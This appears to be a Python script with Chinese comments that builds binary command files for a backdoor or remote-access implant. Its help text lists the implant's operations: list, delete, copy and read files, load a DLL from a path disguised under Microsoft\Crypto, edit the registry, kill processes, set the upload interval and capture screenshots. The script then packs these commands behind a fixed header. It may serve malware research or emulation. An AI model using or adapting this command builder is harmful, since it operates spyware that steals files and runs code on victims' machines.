
import struct
import argparse

# 用于存储最终生成的 payload（二进制数据）
payloads_bin = b''

# 帮助信息函数，用于输出命令行工具的使用说明
def help():
    help_text = """
    用法示例:
    python cmdBinGen.py 1,"c:\desktop\*" 2,"c:\case.txt" 6, 7,

    空格分隔多个payload,逗号分隔cmd与data:
    -c [command], --cmd    指定命令
        1           获取指定目录下的文件列表(c:\Desktop\*)
        2           删除文件(c:\Desktop\case.txt、c:\Desktop\*)
        3           加载dll/执行exe(%appdata%\Microsoft\Crypto\AES\\ascleaner32.dll)
        4           操作注册表
        5           递归文件夹(c:\Desktop\)
        6           获取进程信息
        7           获取网络信息
        8           获取/设置上传时间间隔(单位min)
        9           拷贝文件(逗号或空格分隔源目地址)
        10          移动文件
        11          终止进程(-i [pid] 或 procName)
        12          获取/设置版本信息
        17          获取文件内容(c:\Desktop\case.txt)
        18          获取屏幕截图
    -d, --data       指定命令携带的数据
    """
    print(help_text)

# 生成 payload 二进制数据
def gen_payload_bin(cmd, data):
    global payloads_bin
    payloads_bin += struct.pack('i', cmd)  # 将 cmd（命令 ID）转换为 4 字节整数并添加到 payloads_bin
    if data != "":  # 如果 data 非空
        payloads_bin += struct.pack('i', len(data)+1)  # 添加 data 长度（包括结尾的 '\x00' 字符）
        payloads_bin += data.encode("utf-8") + b'\x00'  # 将 data 编码为 UTF-8 字符串，并以 '\x00' 结尾
    elif data == "":  # 如果 data 为空
        payloads_bin += struct.pack('i', 0)  # 添加 0 表示没有数据

# 输出帮助信息
help()

# 循环获取用户输入的命令 ID 和数据
while True:
    cid = input("cmd id>")  # 提示用户输入命令 ID
    if not cid:  # 如果没有输入命令 ID，则退出循环
        break
    data = input("data>")  # 提示用户输入与命令相关的数据
    gen_payload_bin(int(cid), data)  # 调用 gen_payload_bin 函数生成 payload 数据

# 如果没有生成任何 payloads，则提示并退出
if not payloads_bin:
    print("no?")
    exit(1)

# 获取 payloads_bin 的长度
payloads_len = len(payloads_bin)
# 计算最终二进制数据的大小，包括头部信息（6 字节）
body_len = payloads_len + 6

# 构建最终的 cmd_bin 二进制数据
cmd_bin = b''

# 添加固定的头部信息（表示命令的标识符和一些预设的字符串）
cmd_bin += b'\x30\x46\x41\x32\x32\x45\x36\x36\x36\x43\x00\x53\x2D\x31\x2D\x31\x2D\x31\x31\x2D\x31\x31\x31\x31\x31\x31\x31\x31\x31\x2D\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x2D\x31\x31\x31\x31\x31\x31\x31\x31\x31\x2D\x31\x31\x31\x00'
cmd_bin += b'\x00\x20'  # 标识符和版本信息（可能是系统标识）
cmd_bin += struct.pack('i', body_len)  # 包含 payload 的总长度（即 body_len）
cmd_bin += b'\x01\x00'  # 标志偏移量（用于标识不同的数据类型）
cmd_bin += struct.pack('i', payloads_len)  # 包含 payload 数据的长度
cmd_bin += payloads_bin  # 将 payloads_bin 的二进制数据添加到 cmd_bin

# 将最终生成的 cmd_bin 写入到文件 'CMD_bin3'
with open('CMD_bin3', 'wb') as binary_file:
    binary_file.write(cmd_bin)  # 将二进制数据写入文件

# 这个代码的主要功能是根据用户输入的命令 ID 和数据生成二进制 payload，并将其写入到 CMD_bin3 文件中。其核心逻辑包括：
# 解析用户输入的命令 ID 和数据。
# 使用 struct.pack 将命令 ID 和数据打包为二进制格式。
# 构建二进制文件的头部信息，并将生成的 payload 写入文件。